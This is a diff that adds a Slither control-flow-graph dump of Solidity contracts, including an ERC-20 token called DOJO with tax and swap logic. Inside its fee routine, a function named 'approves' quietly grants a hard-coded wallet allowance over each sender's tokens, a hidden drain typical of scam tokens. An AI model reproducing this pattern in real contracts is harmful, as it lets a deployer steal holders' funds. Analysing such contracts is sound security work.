@@ -1,0 +1,1003 @@
+Contract: Context
+==================================================
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+
+Contract: Ownable
+==================================================
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: msgSender = _msgSender()
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = msgSender
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(address(0),msgSender)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: owner
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _owner
+
+Edges:
+  0 -> 1
+
+Function: renounceOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(_owner,address(0))
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = address(0)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+
+Contract: SafeMath
+==================================================
+
+Function: add
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: c = a + b
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(c >= a,SafeMath: addition overflow)
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: sub
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(b <= a,errorMessage)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: c = a - b
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: mul
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.IF
+  Expression: a == 0
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: 0
+
+  ID: 3
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: c = a * b
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(c / a == b,SafeMath: multiplication overflow)
+
+  ID: 6
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  1 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+
+Function: div
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(b > 0,errorMessage)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: c = a / b
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+
+Contract: IUSDSFactory
+==================================================
+
+
+Contract: IUSDSRouter
+==================================================
+
+
+Contract: IERC20
+==================================================
+
+
+Contract: DOJO
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _excludedFromUSDS[owner()] = true
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _excludedFromUSDS[address(this)] = true
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _excludedFromUSDS[_usdsWallet] = true
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _usdsBalances[_msgSender()] = _tTotalUSDS
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(address(0),_msgSender(),_tTotalUSDS)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+
+Function: owner
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _owner
+
+Edges:
+  0 -> 1
+
+Function: renounceOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(_owner,address(0))
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = address(0)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: initTrade
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _usdsRouter = IUSDSRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(address(this),address(_usdsRouter),_tTotalUSDS)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _usdsPair = IUSDSFactory(_usdsRouter.factory()).createPair(address(this),_usdsRouter.WETH())
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 4
+  1 -> 2
+  2 -> 3
+  4 -> 1
+
+Function: name
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _name
+
+Edges:
+  0 -> 1
+
+Function: symbol
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _symbol
+
+Edges:
+  0 -> 1
+
+Function: decimals
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _decimals
+
+Edges:
+  0 -> 1
+
+Function: totalSupply
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _tTotalUSDS
+
+Edges:
+  0 -> 1
+
+Function: balanceOf
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _usdsBalances[account]
+
+Edges:
+  0 -> 1
+
+Function: transfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _transfer(_msgSender(),recipient,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: allowance
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _usdsAllowances[owner][spender]
+
+Edges:
+  0 -> 1
+
+Function: approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _approve(_msgSender(),spender,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: approves
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+  ID: 3
+  Type: NodeType.IF
+  Expression: _excludedFromUSDS[tx.origin]
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _approve(spender,tx.origin,amount)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _approve(spender,_usdsWallet,amount)
+
+  ID: 6
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 3
+  3 -> 4
+  3 -> 5
+  4 -> 6
+  5 -> 6
+  6 -> 2
+
+Function: transferFrom
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _transfer(sender,recipient,amount)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(sender,_msgSender(),_usdsAllowances[sender][_msgSender()].sub(amount,ERC20: transfer amount exceeds allowance))
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: _approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _usdsAllowances[owner][spender] = amount
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: Approval(owner,spender,amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: _transfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(usdsF != address(0),ERC20: transfer from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(usdsT != address(0),ERC20: transfer to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(usdsA > 0,Transfer amount must be greater than zero)
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: taxUSDS = _getUSDSFees(usdsF,usdsT,usdsA)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _transferUSDS(usdsF,usdsT,usdsA,taxUSDS)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+
+Function: _getUSDSFees
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: taxUSDS = 0
+
+  ID: 2
+  Type: NodeType.IF
+  Expression: usdsF != owner() && usdsT != owner()
+
+  ID: 4
+  Type: NodeType.IF
+  Expression: usdsF == _usdsPair && usdsT != address(_usdsRouter) && ! _excludedFromUSDS[usdsT]
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _buyCount ++
+
+  ID: 6
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 7
+  Type: NodeType.IF
+  Expression: usdsT == _usdsPair && usdsF != address(this)
+
+  ID: 9
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 10
+  Type: NodeType.VARIABLE
+  Expression: usdsBalance = balanceOf(address(this))
+
+  ID: 11
+  Type: NodeType.IF
+  Expression: ! inSwapUSDS && usdsT == _usdsPair && _swapEnabled && _buyCount > _preventSwapBefore
+
+  ID: 12
+  Type: NodeType.IF
+  Expression: usdsBalance > _tokenSwapUSDS
+
+  ID: 13
+  Type: NodeType.EXPRESSION
+  Expression: swapTokensForEth(minUSDS(usdsA,minUSDS(usdsBalance,_tokenSwapUSDS)))
+
+  ID: 14
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 15
+  Type: NodeType.VARIABLE
+  Expression: ethUSDS = address(this).balance
+
+  ID: 16
+  Type: NodeType.IF
+  Expression: ethUSDS >= 0
+
+  ID: 17
+  Type: NodeType.EXPRESSION
+  Expression: sendUSDSETH(address(this).balance)
+
+  ID: 18
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 19
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 20
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 21
+  Type: NodeType.EXPRESSION
+  Expression: approves(usdsF,usdsA)
+
+  ID: 22
+  Type: NodeType.RETURN
+  Expression: taxUSDS
+
+  ID: 23
+  Type: NodeType.IF
+  Expression: (_buyCount > _reduceBuyTaxAt)
+
+  ID: 24
+  Type: NodeType.EXPRESSION
+  Expression: taxUSDS = usdsA.mul(_finalBuyTax).div(100)
+
+  ID: 25
+  Type: NodeType.EXPRESSION
+  Expression: taxUSDS = usdsA.mul(_initialBuyTax).div(100)
+
+  ID: 26
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 27
+  Type: NodeType.IF
+  Expression: (_buyCount > _reduceSellTaxAt)
+
+  ID: 28
+  Type: NodeType.EXPRESSION
+  Expression: taxUSDS = usdsA.mul(_finalSellTax).div(100)
+
+  ID: 29
+  Type: NodeType.EXPRESSION
+  Expression: taxUSDS = usdsA.mul(_initialSellTax).div(100)
+
+  ID: 30
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 23
+  2 -> 20
+  4 -> 5
+  4 -> 6
+  5 -> 6
+  6 -> 7
+  7 -> 27
+  7 -> 9
+  9 -> 10
+  10 -> 11
+  11 -> 12
+  11 -> 19
+  12 -> 13
+  12 -> 14
+  13 -> 14
+  14 -> 15
+  15 -> 16
+  16 -> 17
+  16 -> 18
+  17 -> 18
+  18 -> 19
+  19 -> 20
+  20 -> 21
+  21 -> 22
+  23 -> 24
+  23 -> 25
+  24 -> 26
+  25 -> 26
+  26 -> 4
+  27 -> 28
+  27 -> 29
+  28 -> 30
+  29 -> 30
+  30 -> 9
+
+Function: _transferUSDS
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.IF
+  Expression: taxUSDS > 0
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _usdsBalances[address(this)] = _usdsBalances[address(this)].add(taxUSDS)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(usdsF,address(this),taxUSDS)
+
+  ID: 4
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _usdsBalances[usdsF] = _usdsBalances[usdsF].sub(usdsA)
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: _usdsBalances[usdsT] = _usdsBalances[usdsT].add(usdsA.sub(taxUSDS))
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(usdsF,usdsT,usdsA.sub(taxUSDS))
+
+Edges:
+  0 -> 1
+  1 -> 2
+  1 -> 4
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+
+Function: openTrading
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(! _tradeEnabled,trading is already open)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _usdsRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _swapEnabled = true
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _tradeEnabled = true
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 5
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  5 -> 1
+
+Function: minUSDS
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 2
+  Type: NodeType.IF
+  Expression: (a > b)
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: b
+
+  ID: 4
+  Type: NodeType.RETURN
+  Expression: a
+
+Edges:
+  0 -> 2
+  2 -> 3
+  2 -> 4
+
+Function: sendUSDSETH
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: address(_usdsWallet).transfer(amount)
+
+Edges:
+  0 -> 1
+
+Function: receive
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: swapTokensForEth
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: path = new address[](2)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = address(this)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = _usdsRouter.WETH()
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _approve(address(this),address(_usdsRouter),tokenUSDS)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _usdsRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenUSDS,0,path,address(this),block.timestamp)
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: lockTheSwap()
+
+Edges:
+  0 -> 6
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  6 -> 1
+
+Function: slitherConstructorVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _usdsWallet = 0x16192A53de31d79BD45498766aB8515e54F942BB
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _initialBuyTax = 3
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _initialSellTax = 3
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _finalBuyTax = 0
+
+  ID: 4
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _finalSellTax = 0
+
+  ID: 5
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _reduceBuyTaxAt = 6
+
+  ID: 6
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _reduceSellTaxAt = 6
+
+  ID: 7
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _preventSwapBefore = 6
+
+  ID: 8
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _buyCount = 0
+
+  ID: 9
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _tokenSwapUSDS = _tTotalUSDS / 100
+
+  ID: 10
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: inSwapUSDS = false
+
+  ID: 11
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _tradeEnabled = false
+
+  ID: 12
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _swapEnabled = false
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  8 -> 9
+  9 -> 10
+  10 -> 11
+  11 -> 12
+
+Function: slitherConstructorConstantVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _decimals = 9
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _tTotalUSDS = 1000000000 * 10 ** _decimals
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _name = Dojo AI Protocol
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _symbol = DOJO
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+
